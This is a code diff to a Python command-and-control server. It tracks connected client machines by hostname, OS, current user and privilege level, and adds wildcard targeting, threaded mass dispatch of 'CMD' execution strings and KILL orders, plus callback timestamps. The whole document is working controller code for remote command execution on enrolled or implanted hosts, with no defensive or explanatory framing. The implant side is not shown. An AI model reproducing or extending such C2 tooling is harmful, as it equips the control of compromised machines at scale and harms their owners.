@@ -1,13 +1,15 @@
 import socket
 import threading
 import time
-import ipaddress    
+import ipaddress
+import fnmatch
+from datetime import datetime
 #import copy
 
 HOST='localhost'
 LISTEN_PORT=9999
 BUFFER_SIZE=4096
-TIMEOUT_TIME=60
+TIMEOUT_TIME=5
 
 '''
 Netflow Diagram
@@ -67,6 +69,9 @@ def main():
     while True:
         command_menu()
 
+def get_time():
+    return datetime.now().strftime("%m/%d/%Y %H:%M:%S") #19 chars
+
 def print_pretty(show_dead=True):
     global clients_info
     with clients_lock:
@@ -84,7 +89,7 @@ def print_pretty(show_dead=True):
         if len(sorted_dict) == 0:
             print(f"{style.RED}Clients database is empty{style.RESET}")
         else:
-            print(f"{style.BLUE}{'IP Address':<15} | {'Hostname':<25} | {'OS':<12} | {'Current User':<15} | {'Is Elevated':<11}{style.RESET}")
+            print(f"{style.BLUE}{'IP Address':<15} | {'Hostname':<25} | {'OS':<15} | {'Current User':<15} | {'Elevated':<8} | {'Last Callback':<19}{style.RESET}")
             for client in sorted_dict.values():
                 if client["alive"]:
                     status_color = style.GREEN
@@ -92,7 +97,68 @@ def print_pretty(show_dead=True):
                     status_color = style.RED
                     if not show_dead:
                         continue
-                print(f"{status_color}{client['ipaddr']:<15} | {client['hostname']:<25} | {client['sys_os']:<12} | {client['cur_user']:<15} | {client['elevated']:<11}{style.RESET}")
+                print(f"{status_color}{client['ipaddr']:<15} | {client['hostname']:<25} | {client['sys_os']:<15} | {client['cur_user']:<15} | {client['elevated']:<11} | {client['callback']:<19}{style.RESET}")
+
+'''
+Parses the clients dictionary and returns a list of shallow copies of matching clients
+Execute this function when you have the clients_list lock
+Args: dict of all clients, pattern to search (full IPADDR or HOSTNAME using ? for single char matching and * for all char matching)
+'''
+def search_clients(clients,pattern,alive_only=False):
+    matched = []
+    for client in clients.values():
+        if fnmatch.fnmatch(client['ipaddr'], pattern) or fnmatch.fnmatch(client['hostname'], pattern):
+            if alive_only:
+                if client["alive"]:
+                    matched.append(client)
+            else:
+                matched.append(client)
+    return matched
+
+# Execute this in a with clients_info:
+def send_command_clients(clients_list,command,noisy=True):
+    responses = {}
+    response_lock = threading.Lock()
+    threads = []
+
+    for client_dict in clients_list:
+        t = threading.Thread(target=send_command_client, args=(client_dict,command,responses,response_lock))
+        t.start()
+        threads.append(t)
+
+    for t in threads:
+        t.join()
+
+    # Print responses all at once and sorted
+    print("\nResponses:")
+    sorted_responses = dict(sorted(responses.items(), key=lambda item: ipaddress.IPv4Address(item[0])))
+    for ip, response in sorted_responses.items():
+        #status_code = response[len("CMD_R "):len("CMD_R ")+1]
+        response_pieces = response.split(" ")
+        if response_pieces[1] == "0" or response == "KILL_R server requested kill":
+            print(f"{style.GREEN}{ip:<15} : {response}{style.RESET}")
+        else:
+            print(f"{style.RED}{ip:<15} : {response}{style.RESET}")
+
+'''
+Executes a given command on a client
+Only adds item to responses if there were no keyerrors/network errors
+'''
+def send_command_client(client,command,responses,response_lock):
+    try:
+        client_ip = client["ipaddr"]
+        client_socket = client["cs"]
+        client_socket.send(f"{command}".encode())
+        response = client_socket.recv(BUFFER_SIZE).decode()
+        client["callback"] = get_time()
+        with response_lock:
+            responses[client_ip] = response
+    except KeyError as e:
+        #print("something went wrong")
+        pass
+    except:
+        #print("something went wrong")
+        pass
 
 def command_menu():
     global clients_info
@@ -103,16 +169,39 @@ def command_menu():
     for line in ["1 - List connected clients","2 - Ping Check","3 - Kill a client","4 - Send Command","5 - Exit"]: #,"4 - Exit"
         print("\t"+line)
 
-    response = input(f"Please enter a number: ").strip()
+    response = input(f"{style.BLUE}Please enter a number: {style.RESET}").strip()
     if response == "1": # List
         #with clients_lock: # used inside func
+        print("This list may not be up to date - run a ping to be sure!")
         print_pretty(True)
 
     elif response == "2": # Ping check
-        ping_all(True)
+        with clients_lock:
+            if len(clients_info) == 0:
+                print(f"{style.RED}Clients database is empty{style.RESET}")
+                return
+        ping_all(False)
+        print_pretty(True)
 
     elif response == "3": # Kill by IP
-        client_ipaddr = input("Client IP to kill: ").strip()
+        with clients_lock:
+            if len(clients_info) == 0:
+                print(f"{style.RED}Clients database is empty{style.RESET}")
+                return
+        client_ipaddr = input("Client IP(s) to kill: ").strip()
+        client_cmd = "KILL"
+        with clients_lock:
+            clients_list = search_clients(clients_info,client_ipaddr,True)
+            if len(clients_list) == 0:
+                print(f"{style.RED}Found 0 clients{style.RESET}")
+            else:
+                print(f"{style.BLUE}Killing {len(clients_list)} found alive clients:{style.RESET}")
+                for client_dict in clients_list:
+                    print(f"{client_dict["ipaddr"]:<15} | ",end="")
+                send_command_clients(clients_list,client_cmd,True)
+                ping_all(False)
+                print_pretty(True)
+        '''
         with clients_lock:
             try:
                 client = clients_info[client_ipaddr]
@@ -127,21 +216,25 @@ def command_menu():
                     client["cs"] = None
             except KeyError:
                 print(f"{style.RED}Client {client_ipaddr} not found.{style.RESET}")
+        '''
 
     elif response == "4": # Command by IP
-        client_ipaddr = input("Client IP to command: ").strip()
-        client_cmd = input("Command: ").strip()
         with clients_lock:
-            try:
-                client = clients_info[client_ipaddr]
-                client["cs"].send(f"CMD {client_cmd}".encode())
-            except KeyError:
-                print(f"{style.RED}Client {client_ipaddr} not found.{style.RESET}")
-            except Exception as e:
-                print(f"{style.RED}Error when trying to send command to {client_ip}: {str(e)}. Client killed. {style.RESET}")
-                client["alive"] = False
-                client["cs"] = None
-                # close socket?
+            if len(clients_info) == 0:
+                print(f"{style.RED}Clients database is empty{style.RESET}")
+                return
+        client_ipaddr = input("Client IP(s) to command: ").strip()
+        client_cmd = input("Command: ").strip()
+        client_cmd = "CMD " + client_cmd
+        with clients_lock:
+            clients_list = search_clients(clients_info,client_ipaddr,True)
+            if len(clients_list) == 0:
+                print(f"{style.RED}Found 0 clients{style.RESET}")
+            else:
+                print(f"{style.BLUE}Executing command on {len(clients_list)} found alive clients:{style.RESET}")
+                for client_dict in clients_list:
+                    print(f"{style.GREEN}{client_dict["ipaddr"]:<15}{style.RESET} | ",end="")
+                send_command_clients(clients_list,client_cmd,True)
 
     elif response == "5": # Exit
         confirm = input(f"{style.RED}Are you sure you want to exit? This will kill the server. Type y/n: {style.RESET}").strip()
@@ -152,17 +245,19 @@ def ping_all(noisy=False):
     global clients_info
     threads = []
 
-    with clients_lock:
+    print(f"Beginning ping of all clients. This may take a few seconds...")
+
+    #with clients_lock:
         #clients_snapshot = dict(clients_info) # make a copy to safely iterate. TODO this is so wrong
 
-        for client_ip in clients_info:
-            client = clients_info[client_ip]
-            thread = threading.Thread(target=ping_client, args=(client, noisy))
-            thread.start()
-            threads.append(thread)
+    for client_ip in clients_info:
+        client = clients_info[client_ip]
+        thread = threading.Thread(target=ping_client, args=(client, noisy))
+        thread.start()
+        threads.append(thread)
 
-        for thread in threads:
-            thread.join()  # Wait for all pings to finish
+    for thread in threads:
+        thread.join()  # Wait for all pings to finish
 
 def ping_client(client, noisy=False):
     cs = client["cs"]
@@ -173,6 +268,7 @@ def ping_client(client, noisy=False):
         response = cs.recv(1024)
         if not response: # empty
             raise ValueError("Received empty response")
+        client["callback"] = get_time()
         cs.settimeout(TIMEOUT_TIME)
         if noisy:
             print(f"{style.GREEN}Client {ip} is alive{style.RESET}")
@@ -180,13 +276,11 @@ def ping_client(client, noisy=False):
         if noisy:
             print(f"{style.RED}Client {ip} is dead: {e}{style.RESET}")
         with clients_lock:
-            if client in clients_info:
-                #clients_dead_info[ip] = clients_info.pop(ip)
-                try:
-                    client["cs"].close()
-                finally:
-                    client["alive"] = False
-                    client["cs"] = None
+            try:
+                client["cs"].close()
+            finally:
+                client["alive"] = False
+                client["cs"] = None
 
 '''
 Listens for incoming client connections and attempts to process them.
@@ -204,7 +298,7 @@ def handle_connections(server_sock):
         except TimeoutError:
             continue
         client_sock.settimeout(TIMEOUT_TIME)
-        print(f"Got new connection from {addr}")
+        print(f"Got new connection from {addr}. ",end="")
 
         try:
             received_msg = client_sock.recv(BUFFER_SIZE).decode()
@@ -235,7 +329,8 @@ def handle_connections(server_sock):
                 "elevated" : parts[4],
                 "cs" : client_sock,
                 "thrd" : thread,
-                "alive" : True
+                "alive" : True,
+                "callback" : get_time()
             }
 
             with clients_lock:
@@ -259,6 +354,8 @@ def handle_client(client_sock,addr,real_addr): #real addr is a new copy so dont 
     while True:
         try:
             received_msg = client_sock.recv(BUFFER_SIZE).decode() # TODO sending kill makes this error 10038 an operation was attempted on something that is not a socket
+            with clients_lock:
+                clients_info[real_addr]["callback"] = get_time()
         except ConnectionResetError:
             print(f"Client {real_addr} lost connection")
             with clients_lock:
